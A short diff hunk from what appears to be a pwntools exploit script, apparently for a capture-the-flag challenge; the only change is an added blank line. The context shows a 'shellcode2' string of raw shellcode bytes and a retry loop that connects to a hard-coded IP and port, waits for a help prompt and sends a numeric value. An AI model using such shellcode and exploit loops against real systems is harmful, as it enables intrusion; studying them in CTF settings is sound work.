@@ -6,6 +6,7 @@ shellcode2 = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x
 for y in range(0,10):
 	for x in range(0,4):
 		try:
+			
 			p = remote("106.75.32.60",10000)
 			p.recvuntil("lp' for  help.\n")
 			p.sendline("2057561479")
